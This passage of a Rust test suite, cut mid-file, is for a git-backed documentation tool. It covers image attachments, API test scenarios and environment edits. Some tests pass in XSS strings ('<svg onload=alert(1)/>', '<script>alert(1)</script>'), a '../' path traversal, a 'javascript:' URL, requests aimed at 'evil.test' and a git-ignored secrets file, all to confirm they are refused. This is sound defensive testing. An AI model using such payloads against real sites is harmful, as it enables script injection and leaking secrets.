    assert!(sha.is_some(), "one commit for the picture");
    let repo = Repo::open(tmp.path()).unwrap();
    assert!(
        repo.show_text(&format!("HEAD:{}", attached.path)).is_some(),
        "committed, not just written"
    );
    let read = dit.read_attachment(&attached.path).unwrap();
    assert_eq!(read.bytes, SHOT);
    assert_eq!(read.kind, dit_core::ImageKind::Png);
}

#[test]
fn attaching_the_same_picture_twice_writes_nothing_the_second_time() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let target = dit_core::AttachTarget::Doc("docs/guide.md".into());
    let mut tx = dit.transaction("farid").unwrap();
    let first = tx.add_attachment(&target, "shot.png", SHOT).unwrap();
    tx.commit("dit attach").unwrap().unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    let second = tx.add_attachment(&target, "shot.png", SHOT).unwrap();
    assert_eq!(first, second);
    assert_eq!(
        tx.commit("dit attach").unwrap(),
        None,
        "nothing new to commit"
    );
}

#[test]
fn an_issue_keeps_its_pictures_in_its_own_folder_and_a_comment_links_up_to_them() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let id = issue_with(&mut dit, "Login breaks", dit_core::FieldPatch::default());
    let mut tx = dit.transaction("farid").unwrap();
    let body = tx
        .add_attachment(&dit_core::AttachTarget::Issue(id), "error.png", SHOT)
        .unwrap();
    let comment = tx
        .add_attachment(&dit_core::AttachTarget::Comment(id), "error.png", SHOT)
        .unwrap();
    tx.commit("dit attach").unwrap().unwrap();
    assert!(
        body.path.starts_with("issues/") && body.path.contains("/attachments/error-"),
        "{}",
        body.path
    );
    let folder = body.path.split("/attachments/").next().unwrap();
    assert!(
        tmp.path().join(folder).join("README.md").is_file(),
        "beside the issue's body"
    );
    assert_eq!(
        body.link,
        format!("attachments/{}", body.path.rsplit('/').next().unwrap())
    );
    assert_eq!(comment.path, body.path);
    assert_eq!(
        comment.link,
        format!("../{}", body.link),
        "a comment sits one folder down"
    );
}

#[test]
fn a_picture_over_the_cap_or_not_a_picture_is_refused_and_nothing_is_written() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let target = dit_core::AttachTarget::Doc("docs/guide.md".into());
    let mut big = SHOT.to_vec();
    big.resize(dit_core::MAX_ATTACHMENT_BYTES + 1, 0);
    for (bytes, name) in [
        (big.as_slice(), "big.png"),
        (b"<svg onload=alert(1)/>".as_slice(), "x.svg"),
        (b"plain text".as_slice(), "x.png"),
    ] {
        let mut tx = dit.transaction("farid").unwrap();
        let err = tx.add_attachment(&target, name, bytes).expect_err(name);
        assert!(
            matches!(err, dit_core::DitError::Attachment(_)),
            "{name}: {err:?}"
        );
        assert_eq!(
            tx.commit("dit attach").unwrap(),
            None,
            "{name}: nothing staged"
        );
    }
    assert!(!tmp.path().join("docs/attachments").exists());
}

#[test]
fn reading_an_attachment_stays_inside_the_sandbox_and_trusts_bytes_not_names() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    for bad in [
        "../secret.png",
        "docs/guide.md",
        "docs/x.png",
        ".git/attachments/x.png",
    ] {
        assert!(
            matches!(
                dit.read_attachment(bad),
                Err(dit_core::DitError::Attachment(_))
            ),
            "{bad}"
        );
    }
    // A text file wearing an image's name is not served as one.
    std::fs::create_dir_all(tmp.path().join("docs/attachments")).unwrap();
    std::fs::write(
        tmp.path().join("docs/attachments/fake-0a1b2c3d.png"),
        "<script>alert(1)</script>",
    )
    .unwrap();
    assert!(matches!(
        dit.read_attachment("docs/attachments/fake-0a1b2c3d.png"),
        Err(dit_core::DitError::Attachment(
            dit_core::AttachmentError::NotAnImage
        ))
    ));
    assert!(matches!(
        dit.read_attachment("docs/attachments/missing-0a1b2c3d.png"),
        Err(dit_core::DitError::NotFound(_))
    ));
}

// ---- Body shapes: files come from HEAD (ADR 0027) --------------------------

/// Like `serve`, and hands back each request's raw body.
fn serve_recording(
    responses: Vec<(u16, &'static str)>,
) -> (u16, std::sync::mpsc::Receiver<Vec<u8>>) {
    use std::io::{BufRead, BufReader, Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        for (index, stream) in listener.incoming().enumerate() {
            let Ok(mut stream) = stream else { break };
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let mut line = String::new();
            reader.read_line(&mut line).unwrap();
            let mut len = 0usize;
            loop {
                let mut header = String::new();
                reader.read_line(&mut header).unwrap();
                let header = header.trim_end();
                if header.is_empty() {
                    break;
                }
                if let Some(v) = header.to_ascii_lowercase().strip_prefix("content-length:") {
                    len = v.trim().parse().unwrap_or(0);
                }
            }
            let mut body = vec![0u8; len];
            reader.read_exact(&mut body).unwrap();
            let (status, text) = responses.get(index).copied().unwrap_or((500, "{}"));
            let _ = stream.write_all(
                format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{text}", text.len()).as_bytes(),
            );
            let _ = tx.send(body);
            if index + 1 >= responses.len() {
                break;
            }
        }
    });
    (port, rx)
}

fn upload_scenario(pin: &str, file: &str) -> String {
    format!(
        "```dit-morse\nscenario: upload\nspec: {{ id: auth, commit: {pin} }}\nenv: local\nsteps:\n  - id: send\n    operation: auth/createUser\n    raw: {{ type: application/octet-stream, file: {file} }}\n```\n"
    )
}

#[test]
fn a_file_a_body_sends_is_read_from_head_not_the_working_tree() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    std::fs::create_dir_all(tmp.path().join("fixtures")).unwrap();
    std::fs::write(
        tmp.path().join("fixtures/payload.bin"),
        b"committed\x00bytes",
    )
    .unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add("fixtures").unwrap();
    repo.commit("a fixture").unwrap();
    write_doc(
        &mut dit,
        "docs/api/upload.md",
        &upload_scenario(&pin, "fixtures/payload.bin"),
    );
    // An edit nobody committed is not what a scenario sends.
    std::fs::write(tmp.path().join("fixtures/payload.bin"), b"uncommitted edit").unwrap();
    let (port, seen) = serve_recording(vec![(201, "{}")]);
    point_at(tmp.path(), port);
    let outcome = dit.morse_run("upload", None).unwrap();
    assert!(outcome.steps[0].error.is_none(), "{outcome:#?}");
    assert_eq!(seen.recv().unwrap(), b"committed\x00bytes");
}

#[test]
fn an_ignored_or_uncommitted_file_is_never_sent() {
    // The case ADR 0027 exists for: a fence in a pull request naming a
    // git-ignored file full of secrets. It is not in HEAD, so nothing goes.
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    std::fs::write(tmp.path().join(".gitignore"), ".dit-cache/\nsecrets.env\n").unwrap();
    std::fs::write(tmp.path().join("secrets.env"), "API_KEY=hunter2").unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add(".gitignore").unwrap();
    repo.commit("ignore secrets").unwrap();
    write_doc(
        &mut dit,
        "docs/api/upload.md",
        &upload_scenario(&pin, "secrets.env"),
    );
    let (port, seen) = serve_recording(vec![(201, "{}")]);
    point_at(tmp.path(), port);
    let err = dit.morse_run("upload", None).unwrap_err();
    assert!(
        err.to_string().contains("secrets.env") && err.to_string().contains("HEAD"),
        "{err}"
    );
    assert!(
        seen.recv_timeout(std::time::Duration::from_millis(300))
            .is_err(),
        "nothing reached the server"
    );
}

// ---- Managing scenarios and steps from the screen (ADR 0027) ---------------

fn three_step_scenario(dit: &mut Dit, pin: &str) {
    write_doc(
        dit,
        "docs/api/register.md",
        &format!(
            "# Register\n\nWhy this chain exists.\n\n```dit-morse\nscenario: register\nspec: {{ id: auth, commit: {pin} }}\nenv: local\nsteps:\n  - id: create\n    operation: auth/createUser\n  - id: login\n    operation: auth/loginUser\n  - id: me\n    operation: auth/getCurrentUser\n```\n\nAfter the chain.\n"
        ),
    );
}

fn step_ids(dit: &Dit, scenario: &str) -> Vec<String> {
    dit.morse_scenario(scenario)
        .unwrap()
        .scenario
        .steps
        .iter()
        .map(|s| s.id.clone())
        .collect()
}

#[test]
fn steps_are_moved_duplicated_renamed_and_deleted_one_commit_each() {
    use dit_core::ScenarioEdit as E;
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    three_step_scenario(&mut dit, &pin);
    let repo = Repo::open(tmp.path()).unwrap();
    let commits = |repo: &Repo| {
        repo.git(&["rev-list", "--count", "HEAD"])
            .unwrap()
            .trim()
            .parse::<u32>()
            .unwrap()
    };
    let before = commits(&repo);

    dit.morse_edit_scenario(
        "register",
        E::MoveStep {
            step: "me".into(),
            to: 0,
        },
        "farid",
    )
    .unwrap();
    assert_eq!(step_ids(&dit, "register"), ["me", "create", "login"]);
    dit.morse_edit_scenario(
        "register",
        E::DuplicateStep {
            step: "login".into(),
            as_id: "login-again".into(),
        },
        "farid",
    )
    .unwrap();
    assert_eq!(
        step_ids(&dit, "register"),
        ["me", "create", "login", "login-again"]
    );
    dit.morse_edit_scenario(
        "register",
        E::RenameStep {
            step: "me".into(),
            to: "whoami".into(),
        },
        "farid",
    )
    .unwrap();
    dit.morse_edit_scenario(
        "register",
        E::DeleteStep {
            step: "login-again".into(),
        },
        "farid",
    )
    .unwrap();
    assert_eq!(step_ids(&dit, "register"), ["whoami", "create", "login"]);
    assert_eq!(commits(&repo), before + 4, "one commit per edit");

    let doc = dit.read_doc("docs/api/register.md").unwrap();
    assert!(
        doc.starts_with("# Register\n\nWhy this chain exists.\n\n```dit-morse\n"),
        "{doc}"
    );
    assert!(
        doc.ends_with("```\n\nAfter the chain.\n"),
        "the prose is untouched: {doc}"
    );

    // Ids stay unique, and a step that is not there is named as such.
    for (edit, what) in [
        (
            E::RenameStep {
                step: "create".into(),
                to: "login".into(),
            },
            "taken",
        ),
        (
            E::DuplicateStep {
                step: "create".into(),
                as_id: "whoami".into(),
            },
            "taken",
        ),
        (
            E::RenameStep {
                step: "create".into(),
                to: "two words".into(),
            },
            "one word",
        ),
        (
            E::DeleteStep {
                step: "nope".into(),
            },
            "no step",
        ),
    ] {
        let err = dit
            .morse_edit_scenario("register", edit, "farid")
            .unwrap_err();
        assert!(
            matches!(
                err,
                dit_core::DitError::Refuse(_) | dit_core::DitError::NotFound(_)
            ),
            "{what}: {err}"
        );
    }
}

#[test]
fn a_scenario_s_environment_and_required_names_are_edited_in_its_fence() {
    use dit_core::ScenarioEdit as E;
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    three_step_scenario(&mut dit, &pin);
    dit.morse_edit_scenario("register", E::SetEnv(Some("staging".into())), "farid")
        .unwrap();
    dit.morse_edit_scenario(
        "register",
        E::SetRequires(vec!["email".into(), "password".into()]),
        "farid",
    )
    .unwrap();
    let s = dit.morse_scenario("register").unwrap().scenario;
    assert_eq!(s.env.as_deref(), Some("staging"));
    assert_eq!(s.requires, ["email", "password"]);
    dit.morse_edit_scenario("register", E::SetEnv(None), "farid")
        .unwrap();
    assert_eq!(dit.morse_scenario("register").unwrap().scenario.env, None);
}

#[test]
fn a_scenario_is_renamed_or_deleted_unless_an_issue_names_it() {
    use dit_core::ScenarioEdit as E;
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    three_step_scenario(&mut dit, &pin);

    dit.morse_edit_scenario(
        "register",
        E::Rename {
            to: "sign-up".into(),
        },
        "farid",
    )
    .unwrap();
    assert!(matches!(
        dit.morse_scenario("register"),
        Err(dit_core::DitError::NotFound(_))
    ));
    assert_eq!(step_ids(&dit, "sign-up").len(), 3);

    // An issue that needs the scenario would lose its gate silently.
    let needing = issue_with(
        &mut dit,
        "Ship sign-up",
        dit_core::FieldPatch {
            needs_scenarios: Some(vec!["sign-up".into()]),
            ..Default::default()
        },
    );
    let err = dit
        .morse_edit_scenario("sign-up", E::Rename { to: "join".into() }, "farid")
        .unwrap_err();
    assert!(
        err.to_string().contains("Ship sign-up"),
        "names the issue: {err}"
    );
    let err = dit.morse_delete_scenario("sign-up", "farid").unwrap_err();
    assert!(err.to_string().contains("Ship sign-up"), "{err}");

    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields(
        &needing,
        dit_core::FieldPatch {
            needs_scenarios: Some(vec![]),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("let go of it").unwrap();
    dit.morse_delete_scenario("sign-up", "farid").unwrap();
    assert!(matches!(
        dit.morse_scenario("sign-up"),
        Err(dit_core::DitError::NotFound(_))
    ));
    let doc = dit.read_doc("docs/api/register.md").unwrap();
    assert_eq!(
        doc,
        "# Register\n\nWhy this chain exists.\n\nAfter the chain.\n"
    );

    // A name already in use is refused.
    three_step_scenario(&mut dit, &pin);
    write_doc(
        &mut dit,
        "docs/api/other.md",
        &format!("```dit-morse\nscenario: other\nspec: {{ id: auth, commit: {pin} }}\nsteps:\n  - id: a\n    operation: auth/createUser\n```\n"),
    );
    let err = dit
        .morse_edit_scenario(
            "other",
            E::Rename {
                to: "register".into(),
            },
            "farid",
        )
        .unwrap_err();
    assert!(err.to_string().contains("register"), "{err}");
}

// ---- Environments edited from the page (ADR 0027) --------------------------

fn local_file(root: &Path) -> String {
    std::fs::read_to_string(root.join(dit_core::MORSE_LOCAL_PATH)).unwrap_or_default()
}

#[test]
fn an_environment_is_created_and_edited_and_its_values_never_come_back() {
    use dit_core::EnvEdit;
    let tmp = tempfile::tempdir().unwrap();
    let (dit, _) = morse_workspace(tmp.path());
    std::fs::write(
        tmp.path().join(dit_core::MORSE_LOCAL_PATH),
        "allow_hosts:\n  - 127.0.0.1\n",
    )
    .unwrap();
    let tricky = r#"p@ss "quoted" \back\slash ünï"#;
    dit.morse_edit_env(
        "staging",
        EnvEdit::Upsert {
            server: Some(Some("https://api.staging.acme.test".into())),
            set: vec![
                ("email".into(), Some("dev@acme.test".into())),
                ("password".into(), Some(tricky.into())),
            ],
        },
    )
    .unwrap();
    let envs = dit.morse_envs().unwrap();
    let staging = envs.envs.iter().find(|e| e.name == "staging").unwrap();
    assert_eq!(
        staging.server.as_deref(),
        Some("https://api.staging.acme.test")
    );
    assert_eq!(staging.vars, ["email", "password"], "names only");
    // The value survives the file byte for byte.
    let reread = dit_morse_local_value(tmp.path(), "staging", "password");
    assert_eq!(reread.as_deref(), Some(tricky));
    // The allowlist is exactly what it was: a page cannot trust a host.
    assert!(local_file(tmp.path()).contains("allow_hosts:\n  - 127.0.0.1\n"));
    assert!(!local_file(tmp.path()).contains("api.staging.acme.test\n  -"));

    dit.morse_edit_env(
        "staging",
        EnvEdit::Upsert {
            server: Some(None),
            set: vec![("email".into(), None)],
        },
    )
    .unwrap();
    let staging = dit
        .morse_envs()
        .unwrap()
        .envs
        .into_iter()
        .find(|e| e.name == "staging")
        .unwrap();
    assert_eq!(staging.server, None);
    assert_eq!(staging.vars, ["password"]);

    dit.morse_edit_env("staging", EnvEdit::Rename { to: "stage".into() })
        .unwrap();
    assert!(dit
        .morse_envs()
        .unwrap()
        .envs
        .iter()
        .any(|e| e.name == "stage"));
    dit.morse_edit_env("stage", EnvEdit::Delete).unwrap();
    assert!(dit.morse_envs().unwrap().envs.is_empty());
    assert!(
        local_file(tmp.path()).contains("127.0.0.1"),
        "deleting an env leaves the allowlist"
    );
}

#[test]
fn an_environment_edit_refuses_addresses_and_names_that_would_mislead() {
    use dit_core::EnvEdit;
    let tmp = tempfile::tempdir().unwrap();
    let (dit, _) = morse_workspace(tmp.path());
    for server in [
        "ftp://x.test",
        "https://user:pw@x.test",
        "x.test",
        "https://x.test/a b",
        "javascript:alert(1)",
    ] {
        let err = dit
            .morse_edit_env(
                "e",
                EnvEdit::Upsert {
                    server: Some(Some(server.into())),
                    set: vec![],
                },
            )
            .unwrap_err();
        assert!(
            matches!(err, dit_core::DitError::Refuse(_)),
            "{server}: {err}"
        );
    }
    for (name, var) in [("two words", "a"), ("ok", "has space"), ("ok", "")] {
        let err = dit
            .morse_edit_env(
                name,
                EnvEdit::Upsert {
                    server: None,
                    set: vec![(var.into(), Some("v".into()))],
                },
            )
            .unwrap_err();
        assert!(
            matches!(err, dit_core::DitError::Refuse(_)),
            "{name}/{var}: {err}"
        );
    }
    let err = dit
        .morse_edit_env(
            "ok",
            EnvEdit::Upsert {
                server: None,
                set: vec![("a".into(), Some("line\nbreak".into()))],
            },
        )
        .unwrap_err();
    assert!(matches!(err, dit_core::DitError::Refuse(_)), "{err}");
    assert!(matches!(
        dit.morse_edit_env("missing", EnvEdit::Delete),
        Err(dit_core::DitError::NotFound(_))
    ));
}

/// What the local file holds for one variable — parsed the way a run reads
/// it. Through the adapter on purpose: nothing on `Dit` returns a value.
fn dit_morse_local_value(root: &Path, env: &str, var: &str) -> Option<String> {
    let local = dit_morse::LocalConfig::parse(&local_file(root)).unwrap();
    local.envs.get(env)?.vars.get(var).cloned()
}

// ---- New requests: a method and a path (ADR 0027) ---------------------------

fn send_draft_for(target: dit_core::SendTarget) -> dit_core::SendDraft {
    dit_core::SendDraft {
        target,
        params: vec![],
        query: vec![],
        headers: vec![],
        body: None,
        expect: dit_core::Expect::default(),
        capture: vec![],
    }
}

fn inline(id: &str, method: &str, path: &str) -> dit_model::InlineRequest {
    dit_model::InlineRequest {
        id: id.into(),
        method: method.into(),
        path: path.into(),
        summary: None,
    }
}

#[test]
fn a_request_no_spec_describes_is_sent_to_the_spec_s_host() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    let port = serve(vec![(204, "{}")]);
    point_at(tmp.path(), port);
    let outcome = dit
        .morse_send(
            &send_draft_for(dit_core::SendTarget::Request {
                spec: "auth".into(),
                request: inline("ping", "post", "/internal/ping"),
            }),
            Some("local"),
        )
        .unwrap();
    assert!(outcome.steps[0].error.is_none(), "{outcome:#?}");
    assert_eq!(outcome.steps[0].method, "POST");
    assert_eq!(
        outcome.steps[0].url,
        format!("http://127.0.0.1:{port}/internal/ping")
    );
}

#[test]
fn a_new_request_cannot_name_a_host_or_an_unknown_verb() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    for (method, path) in [
        ("GET", "https://evil.test/x"),
        ("GET", "//evil.test/x"),
        ("FETCH", "/x"),
    ] {
        let err = dit
            .morse_send(
                &send_draft_for(dit_core::SendTarget::Request {
                    spec: "auth".into(),
                    request: inline("x", method, path),
                }),
                Some("local"),
            )
            .unwrap_err();
        assert!(
            matches!(err, dit_core::DitError::Refuse(_)),
            "{method} {path}: {err}"
        );
    }
}

#[test]
fn a_new_request_is_saved_into_a_scenario_with_its_step_in_one_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    three_step_scenario(&mut dit, &pin);
    let step = dit_model::MorseStep {
        id: "ping".into(),
        operation: dit_model::StepTarget::Inline("ping".into()),
        params: vec![],
        headers: vec![],
        query: vec![],
        body: None,
        expect: dit_core::Expect {
            status: Some(204),
            json: vec![],
        },
        capture: vec![],
    };
    dit.morse_save_step(
        "register",
        step.clone(),
        Some(inline("ping", "post", "/internal/ping")),
        "farid",
    )
    .unwrap();
    let s = dit.morse_scenario("register").unwrap().scenario;
    assert_eq!(
        s.requests,
        [inline("ping", "POST", "/internal/ping")],
        "stored as people write it"
    );
    assert_eq!(
        s.steps.last().unwrap().operation,
        dit_model::StepTarget::Inline("ping".into())
    );
    // Editing the request changes it in place.
    dit.morse_save_step(
        "register",
        step,
        Some(inline("ping", "GET", "/internal/health")),
        "farid",
    )
    .unwrap();
    let s = dit.morse_scenario("register").unwrap().scenario;
    assert_eq!(s.requests, [inline("ping", "GET", "/internal/health")]);

    // A new scenario can start from one, too.
    let created = dit
        .morse_create_scenario(
            "docs/api/ping.md",
            "ping-only",
            "auth",
            None,
            dit_model::MorseStep {
                id: "p".into(),
                ..s.steps.last().unwrap().clone()
            },
            vec![inline("ping", "GET", "/internal/health")],
            "farid",
        )
        .unwrap();
    assert_eq!(created.requests.len(), 1);
}

#[test]
fn a_request_another_step_calls_is_not_redefined_from_under_it() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    three_step_scenario(&mut dit, &pin);
    let calling = |id: &str| dit_model::MorseStep {
        id: id.into(),
        operation: dit_model::StepTarget::Inline("ping".into()),
        params: vec![],
        headers: vec![],
        query: vec![],
        body: None,
        expect: dit_core::Expect::default(),
        capture: vec![],
    };
    dit.morse_save_step(
        "register",
        calling("first"),
        Some(inline("ping", "GET", "/ping")),
        "farid",
    )
    .unwrap();
    // A second step reusing the request as it stands is fine…
    dit.morse_save_step(
        "register",
        calling("second"),
        Some(inline("ping", "GET", "/ping")),
        "farid",
    )
    .unwrap();
    // …but changing it from one step would silently change the other.
    let err = dit
        .morse_save_step(
            "register",
            calling("second"),
            Some(inline("ping", "POST", "/other")),
            "farid",
        )
        .unwrap_err();
    assert!(
        err.to_string().contains("first"),
        "names the other step: {err}"
    );
}
